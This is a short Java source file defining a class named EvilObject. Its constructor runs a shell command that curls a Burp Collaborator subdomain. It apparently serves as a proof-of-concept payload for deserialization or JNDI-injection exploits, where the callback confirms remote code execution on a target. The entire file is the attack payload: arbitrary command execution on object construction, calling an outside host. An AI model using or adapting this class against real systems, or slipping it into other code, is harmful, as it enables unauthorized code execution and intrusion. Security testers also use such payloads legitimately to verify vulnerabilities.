public class EvilObject {
    public EvilObject() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"/bin/sh", "-c", "curl https://sfbzov9ihxhj6w86zppcn3z9r0xqlf.burpcollaborator.net"};
        Process pc = rt.exec(commands);
        pc.waitFor();
    }
}
